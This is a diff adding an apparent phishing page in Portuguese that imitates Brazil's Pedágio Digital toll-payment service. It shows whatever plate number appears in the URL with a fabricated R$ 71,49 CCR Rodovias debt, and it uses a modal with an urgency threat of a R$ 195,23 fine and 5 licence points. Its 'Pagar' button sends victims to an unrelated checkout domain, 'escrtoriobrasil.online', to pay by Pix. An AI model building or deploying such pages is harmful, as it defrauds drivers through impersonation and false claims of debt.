@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Débitos</title>
+<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;500;700&display=swap" rel="stylesheet"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Ubuntu',sans-serif;background:#f2f2f2;color:#333;min-height:100vh;padding-bottom:140px}
+
+/* Modal overlay */
+.modal-overlay{position:fixed;inset:0;z-index:2000;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.7);padding:20px}
+.modal-box{width:100%;max-width:400px;border-radius:24px;background:#fff;padding:24px;text-align:center}
+.modal-title{display:flex;align-items:center;justify-content:center;gap:8px;font-weight:700;color:#d32f2f;margin-bottom:12px;font-size:15px}
+.modal-text{font-size:13px;margin-bottom:20px;line-height:1.5}
+.modal-text b{color:#d32f2f;font-weight:700}
+.modal-btn{width:100%;border:none;border-radius:12px;background:#000;color:#fff;padding:16px;font-weight:700;font-size:14px;cursor:pointer}
+
+/* Header */
+header{position:relative;display:flex;align-items:center;justify-content:center;height:56px;border-bottom:1px solid #e0e0e0;background:#fff}
+header button{position:absolute;left:16px;border:none;background:none;font-size:20px;cursor:pointer}
+header h1{font-size:16px;font-weight:500}
+
+/* Hero */
+.hero{position:relative;height:160px;background:#fff;overflow:hidden}
+.hero img{width:100%;height:100%;object-fit:cover}
+.hero-label{position:absolute;bottom:35px;left:20px;z-index:5;display:flex;align-items:center;gap:6px;font-size:13px;font-weight:500;color:#fff}
+
+/* Plate */
+.plate-wrap{position:relative;z-index:10;margin-top:-28px;padding:0 20px}
+.plate-box{border-radius:8px;border:1px solid #eee;background:#fff;padding:16px 20px;font-size:15px;font-weight:700;box-shadow:0 2px 8px rgba(0,0,0,.08)}
+
+/* Section */
+.debt-section{padding:20px}
+.cb-row{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:500;margin-bottom:20px}
+.cb-row input{width:20px;height:20px;cursor:pointer;accent-color:#000}
+
+/* Debt card */
+.debt-card{margin-bottom:24px}
+.debt-top{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:4px}
+.debt-top .plate{font-weight:700}
+.badge{border:1px solid #d32f2f;border-radius:8px;padding:2px 6px;font-size:10px;font-weight:700;color:#d32f2f}
+.debt-date{display:block;font-size:13px;color:#666;margin-bottom:6px}
+.debt-bottom{display:flex;align-items:flex-end;justify-content:space-between}
+.debt-bottom .operator{font-weight:700}
+.debt-bottom .amount{font-size:16px;font-weight:700}
+.debt-fine{display:block;text-align:right;font-size:11px;color:#d32f2f;margin-top:4px}
+.debt-total{display:block;text-align:right;font-size:13px;font-weight:700;margin-top:4px}
+
+/* Payment */
+.payment-area{margin-top:24px}
+.payment-area h2{font-size:15px;font-weight:700;margin-bottom:12px}
+.pix-option{display:flex;align-items:center;gap:16px;border-radius:12px;border:2px solid transparent;background:#fff;padding:16px;cursor:pointer;transition:.2s}
+.pix-option.selected{border-color:#eaff00;background:#fafdf0}
+.pix-icon{width:40px;height:40px;display:flex;align-items:center;justify-content:center;border-radius:8px;background:#eaff00;overflow:hidden}
+.pix-icon img{width:100%;height:100%;object-fit:contain;padding:4px}
+.pix-label{flex:1;font-size:14px;font-weight:700}
+
+/* Footer */
+.footer-bar{position:fixed;bottom:0;left:0;z-index:100;width:100%;border-radius:16px 16px 0 0;background:#fff;padding:16px 20px;box-shadow:0 -4px 10px rgba(0,0,0,.05)}
+.footer-total-label{font-size:13px;color:#666}
+.footer-total-value{font-size:16px;font-weight:700;color:#000;margin-bottom:10px;display:block}
+.footer-btn{width:100%;border:none;border-radius:8px;padding:14px;font-size:14px;font-weight:700;transition:.2s;cursor:pointer}
+.footer-btn.active{background:#000;color:#fff}
+.footer-btn.disabled{background:#ccc;color:#fff;cursor:not-allowed}
+
+.hidden{display:none}
+</style>
+</head>
+<body>
+
+<div class="modal-overlay" id="modal">
+  <div class="modal-box">
+    <div class="modal-title">⚠ ATENÇÃO</div>
+    <p class="modal-text">
+      <b id="modalTime"></b> - Caso não realize o pagamento, o sistema emitirá automaticamente a multa de
+      <b>R$ 195,23</b> e <b>5 pontos na CNH</b>.
+    </p>
+    <button class="modal-btn" onclick="document.getElementById('modal').classList.add('hidden')">CONTINUAR</button>
+  </div>
+</div>
+
+<header>
+  <button onclick="history.back()">←</button>
+  <h1>Débitos</h1>
+</header>
+
+<section class="hero">
+  <img src="https://www.pedagiodigital.com/assets/home-KlC6Y-6S.png" alt="Pedágio Digital"/>
+  <div class="hero-label">🚗 Seus veículos:</div>
+</section>
+
+<div class="plate-wrap">
+  <div class="plate-box" id="plateBox">PLACA</div>
+</div>
+
+<section class="debt-section">
+  <div class="cb-row">
+    <input type="checkbox" id="debtCb"/>
+    <span>Selecionar 1 passagens em aberto</span>
+  </div>
+
+  <div class="debt-card">
+    <div class="debt-top">
+      <span class="plate" id="cardPlate">PLACA</span>
+      <span class="badge">Venceu em 12/02/2026</span>
+    </div>
+    <span class="debt-date">10/02/2026 02:30:38</span>
+    <div class="debt-bottom">
+      <span class="operator">CCR Rodovias</span>
+      <span class="amount">R$ 71,49</span>
+    </div>
+    <span class="debt-fine">Multa + Juros: R$ 0,00 + R$ 0,00</span>
+    <span class="debt-total">Total: 71,49</span>
+  </div>
+
+  <div class="payment-area hidden" id="paymentArea">
+    <h2>Forma de pagamento</h2>
+    <div class="pix-option" id="pixOption" onclick="selectPix()">
+      <div class="pix-icon">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAApCAYAAABHomvIAAAEOklEQVR4AcyYS2wTVxSG/xmVPiQMplIrBUIbWqm4j4RWVFAJV6KCbkil2qabUqnj7kpD93E2bTdx9iWwTIwU2MVGImwAgYSReIpHeAQk3mBLIEGIWfCKL+e/4QYnWGQ8HuIZzfHM3Hvn3G/O+c/ckW1U2a6qWPiWSiRvq8S/s2EFtT5WVLGWKiiYAshBBRXf/zas+xZUH6D+wSyYQjlbhnVVgtFHhkrQScCiWu/IoJMKWI2GbSpJBrIYBA1YVL+sLqPcL41hsUbvYbLcVDEdKA2oMC7pbDTX1PltWH2sBfuWiiUlrS1TuwNx1fIO7KQtpE4gcKpCqJ9tid7XVfsC0Eg2WziCUBiCUXUPE7BqT1AafQMce/AM27bc1Hb7xiPfns8XwJHhh/jxqzzSnRe1xVcdRnag6Atk3YCEc9YdRyg8B3vPRrU1f/weujae8wWyLsBKuMzQciz66F1tPP+8LeQLpGdAA0ftrWn/QIOZnIbmv4XOns/0Zb2R9Ay4UKL1/45lWPPTh1IYN9CbvqKB+EP4v389jUWS6szu5Vjx/QI2e7KaAXMi/rWteSSihzVUSiIV/60JmwWQkIQzmmSqjx28D6f9OHiPl8KpCZBwKRF/aP4crIi+j5EzD0GYjtSnMJC8ZsEQrjd9WYNHWkMSPcuTJl0DMjKEi7SFwMm7t36hj6UH41MgK+EYsY7UJ9i8fRmy+ZUwhXNUoirErnbXgF1/npvQlFTrPCkCeo+0zX0FclBAGDkDt0kAOTYk9/DBqMvenpd6Zd/rzDXgheES4huaYOCMU0JSh1w9EtEjWpuEY2EYODOWkPTxRiLICbMDBRDETMgjU88VhJFh9Abz34F6JASLhmOM8ZVEHxGRiWmb6eg6gqn0Uhi9GUjCTS+KhCxzHRVFYyAJ56w7oR+QEZ8JzPS7BoxM01vXxvO6OKYXBeEdWfoqITdtOC1jT2BEZNK99Ut5A7h/L7oG5BMZyHmy7h7N30NEUkXhVxZFVlJsIk3IDikSgpXGnoJwTD99ubWaAOk0IpGk1jJD34KTpzsvITtQ1OcsCvYT2kDy1UJd7h2Oam3SRy1WM6BxziJwRFP7dt2ZhDN9hOyW9yTTTSkU6vg+9AzIVHWLngi1b+guWAQ8pxGMlU0pMJqR1rls9mSeATmbgRw5U4LTPlGhhHOkSEpj46gXjnPUBUgHhGRhFK4/wlr5qqb5BUf/dQPSCTU3eGglUj1Lte0ZXoV60kqfxnwBpDN+Tf/+12LQpi+H7PdqvgF6BZjpPgKOzjSogf2jtgWcQkA3skkErZ0B5UMZVsZ+LH9cCum1AEJea7YG++0lVm50HOqPoAGWXzBJioHFVu6AmmgIQsGMkoVMDJoG5Emzleu3ob6R/+QyvG6EidQOkIEsZv5JQDY0WTnJezYpg5ZI2uOA9d9sGCP2BGrBQiv7AxlQsT0HAAD//3SWnEIAAAAGSURBVAMA0yh2lU3d0/oAAAAASUVORK5CYII=" alt="Pix"/>
+      </div>
+      <div class="pix-label">Pix</div>
+      <span>❯</span>
+    </div>
+  </div>
+</section>
+
+<div class="footer-bar">
+  <span class="footer-total-label">Total a pagar:</span>
+  <span class="footer-total-value" id="totalValue">R$ 0,00</span>
+  <button class="footer-btn disabled" id="payBtn" onclick="pay()">Continuar</button>
+</div>
+
+<script>
+// Read plate from URL
+const params = new URLSearchParams(location.search);
+const plate = (params.get('plate') || 'PLACA').toUpperCase();
+document.getElementById('plateBox').textContent = plate;
+document.getElementById('cardPlate').textContent = plate;
+
+// Time
+const now = new Date();
+const hh = String(now.getHours()).padStart(2,'0');
+const mm = String(now.getMinutes()).padStart(2,'0');
+document.getElementById('modalTime').textContent = 'Hoje às ' + hh + ':' + mm;
+
+let debtSelected = false;
+let pixSelected = false;
+
+const debtCb = document.getElementById('debtCb');
+const paymentArea = document.getElementById('paymentArea');
+const pixOption = document.getElementById('pixOption');
+const totalValue = document.getElementById('totalValue');
+const payBtn = document.getElementById('payBtn');
+
+debtCb.addEventListener('change', function(){
+  debtSelected = this.checked;
+  pixSelected = false;
+  pixOption.classList.remove('selected');
+  paymentArea.classList.toggle('hidden', !debtSelected);
+  update();
+});
+
+function selectPix(){
+  if(debtSelected){
+    pixSelected = true;
+    pixOption.classList.add('selected');
+    update();
+  }
+}
+
+function update(){
+  totalValue.textContent = debtSelected ? 'R$ 71,49' : 'R$ 0,00';
+  if(debtSelected && pixSelected){
+    payBtn.className = 'footer-btn active';
+    payBtn.textContent = 'Pagar';
+  } else {
+    payBtn.className = 'footer-btn disabled';
+    payBtn.textContent = 'Continuar';
+  }
+}
+
+function pay(){
+  if(debtSelected && pixSelected){
+    // Redireciona para o link de checkout fornecido
+    window.location.href = 'https://checkout.escrtoriobrasil.online/VCCL1O8SCOW9';
+  }
+}
+</script>
+</body>
+</html>
